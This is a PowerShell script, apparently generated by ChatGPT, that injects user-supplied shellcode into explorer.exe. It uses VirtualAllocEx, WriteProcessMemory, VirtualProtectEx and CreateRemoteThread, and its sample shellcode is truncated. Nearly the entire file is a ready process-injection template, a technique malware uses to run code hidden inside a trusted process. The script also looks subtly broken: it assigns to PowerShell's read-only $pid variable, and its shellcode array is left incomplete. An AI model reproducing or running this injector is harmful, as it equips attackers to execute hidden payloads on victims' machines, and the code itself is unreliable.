# Chat GPT created example for raw PS injecting shellcode to explorer.exe 
# May be usable in ise to demonstrate in memory shellcode inject
# https://chatgpt.com/share/d79208ed-3291-4f9f-a3b8-ecd52cfa08eb

# Define the shellcode (Example: 64-bit MessageBox shellcode)
# Replace this with your own shellcode (hex-encoded).
$shellcode = @(
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
    0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52,
    # (truncated for brevity)
)

# Convert shellcode to a byte array
$byteArray = [Byte[]]($shellcode)

# Get the process ID of explorer.exe
$explorer = Get-Process explorer
$pid = $explorer.Id

# Define necessary WinAPI methods
Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class Win32 {
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
"@

# Constants for permissions and memory allocation
$PROCESS_ALL_ACCESS = 0x001F0FFF
$MEM_COMMIT = 0x00001000
$MEM_RESERVE = 0x00002000
$PAGE_READWRITE = 0x04
$PAGE_EXECUTE_READ = 0x20

# Open the target process (explorer.exe)
$hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $pid)

# Allocate memory in the target process (RW permissions)
$memSize = $byteArray.Length
$remoteAddr = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $memSize, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)

if ($remoteAddr -eq [IntPtr]::Zero) {
    Write-Host "Failed to allocate memory in the target process."
    exit
}

# Write the shellcode to the allocated memory
$outVar = [UIntPtr]::Zero
$result = [Win32]::WriteProcessMemory($hProcess, $remoteAddr, $byteArray, $memSize, [ref]$outVar)

if (-not $result) {
    Write-Host "Failed to write shellcode to the target process memory."
    [Win32]::CloseHandle($hProcess)
    exit
}

# Change memory permissions to Execute-Read (RX)
$oldProtect = 0
$result = [Win32]::VirtualProtectEx($hProcess, $remoteAddr, $memSize, $PAGE_EXECUTE_READ, [ref]$oldProtect)

if (-not $result) {
    Write-Host "Failed to change memory permissions to Execute-Read."
    [Win32]::CloseHandle($hProcess)
    exit
}

# Create a remote thread to execute the shellcode
$thread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $remoteAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)

if ($thread -eq [IntPtr]::Zero) {
    Write-Host "Failed to create a remote thread in the target process."
} else {
    Write-Host "Shellcode injected and executed successfully."
}

# Close the process handle
[Win32]::CloseHandle($hProcess)
